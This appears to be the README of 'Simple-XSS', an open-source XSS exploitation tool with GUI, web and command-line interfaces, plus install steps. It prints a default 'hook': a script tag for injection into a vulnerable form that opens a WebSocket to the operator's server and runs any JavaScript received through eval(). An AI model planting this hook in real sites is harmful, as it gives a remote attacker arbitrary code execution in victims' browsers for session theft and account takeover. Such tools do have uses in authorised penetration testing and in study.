# Simple-XSS

Simple-XSS is a multiplatform XSS vulnerability exploiter.

## Algorithm

## Usage

### Hook

> _Hooks folder: [hooks](hooks)_


**Hook** is an HTML code that can be embedded in a vulnerable XSS form. It looks like:

```html

<script>c = new WebSocket('{{environment.public_url}}');c.onmessage = (e) => eval(e.data);</script>
```

This is a [default](hooks/default) hook. When it's embedded in the vulnerable form, it downloads the JS
code ([payload](#payload)) via
WebSockets
protocol from the server and
executes it using [eval](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/eval).

### Payload

> _Payloads folder: [payloads](payloads)_

**Payload** is a JS code that loaded by hook on a vulnerable page and executed
with [eval](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/eval).

### Internal Objects

#### Environment

#### Metadata

Firstly you need to choose hook:

## Interface

> _Thanks to the use of the [Python Flet framework](https://flet.dev/), the application works equally well both in the
browser and in the graphical interface._

### Graphical

![GUI](docs/GUI.png)

### WEB

![WEB](docs/WEB.png)

### Command Line

![CLI](docs/CLI.png)

## Installation

### Windows

First you need to clone the repository:

```commandline
git clone https://github.com/CrazyProger1/Simple-XSS
```

Then go to the folder & install requirements:

```commandline
cd Simple-XSS
pip install -r requirements.txt
```

And finally you can run it:

```commandline
python main.py
```

### Linux

## License

Simple-XSS is released under the MIT License. See the bundled [LICENSE](LICENSE) file for details.
